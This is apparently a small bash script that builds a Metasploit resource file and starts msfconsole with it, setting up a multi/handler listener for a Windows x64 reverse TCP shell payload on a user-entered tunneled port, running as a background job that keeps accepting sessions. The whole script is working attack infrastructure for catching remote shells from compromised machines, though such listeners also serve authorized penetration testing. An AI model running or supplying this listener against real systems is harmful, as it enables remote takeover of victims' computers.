#!/bin/bash

clear



ip=($(ip addr show eth0 | awk '$1 == "inet" {gsub(/\/.*$/, "", $2); print $2}'))



echo -n "Please enter the local port that is being tunneled to: "
read port



touch autolistener.rc

echo use exploit/multi/handler >> autolistener.rc
echo set PAYLOAD windows/x64/shell/reverse_tcp >> autolistener.rc
echo set LHOST "127.0.0.1"  >> autolistener.rc
echo set LPORT $port >> autolistener.rc
echo set ExitOnSession false >> autolistener.rc
echo run -j -z >> autolistener.rc
 

sudo msfconsole -r autolistener.rc